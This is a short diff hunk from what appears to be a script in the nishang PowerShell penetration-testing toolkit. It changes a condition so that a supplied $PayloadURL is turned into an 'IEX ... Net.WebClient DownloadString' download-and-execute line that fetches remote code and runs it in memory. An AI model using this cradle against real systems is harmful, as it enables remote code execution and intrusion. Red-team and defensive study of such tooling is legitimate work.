@@ -83,8 +83,8 @@ https://github.com/samratashok/nishang
 
     else
     {
-        #Check if the payload has been provided by the user
-        if(!$Payload)
+        #Check if the payload url has been provided by the user
+        if($PayloadURL)
         {
             $Payload = "IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
         }
